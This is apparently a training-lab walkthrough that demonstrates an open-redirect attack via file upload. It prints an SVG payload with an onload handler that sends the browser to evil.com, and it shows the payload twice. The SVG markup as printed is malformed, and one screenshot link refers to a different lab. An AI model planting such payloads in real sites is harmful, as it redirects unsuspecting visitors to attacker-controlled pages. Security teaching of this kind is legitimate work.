# Lab 9: File Upload!? Redirect IT!

---

## Introduction to the Lab

This Lab will provide you a walkthrough of how you can exploit Open Redirect vulnerability when uploading a file. Over here we have a web application which has the functionality to upload a file!

## Steps to Reproduce

![Lab%209%20File%20Upload!%20Redirect%20IT!%202fb65b103eb5442692a119b724665daf/Untitled.png](Lab%209%20File%20Upload!%20Redirect%20IT!%202fb65b103eb5442692a119b724665daf/Untitled.png)

Amazing! How about creating an `svg` file which contains the code to redirect the user `[http://evil.com](http://evil.com)`.

Alright! So the `svg` file will have the following code:

```jsx
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
svg
onload="window.location='http://evil.com'"
xmlns="http://www.w3.org/2000/svg"
</svg>
</code>
```

Perfect! Now let's just upload the file, submit it and check out what happens!

![Lab%202%20Story%20of%20a%20beautiful%20Header!%20d54dc765e13742c69d4214bdb23f75ab/Untitled%208.png](Lab%202%20Story%20of%20a%20beautiful%20Header!%20d54dc765e13742c69d4214bdb23f75ab/Untitled%208.png)

Great! We were redirected to `http://evil.com`

## Payload(s) Used

In this lab we have used the following svg file. 

```jsx
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
svg
onload="window.location='http://evil.com'"
xmlns="http://www.w3.org/2000/svg"
</svg>
</code>
```

You can use any website you want to redirect the user.

## Conclusion

This lab was an attempt to provide how Open Redirect vulnerability can be exploited in File Uploads. The Open Redirect vulnerability we saw in this lab has a severity of P4 with a CVSS score of 0.1-3.9 which is Low.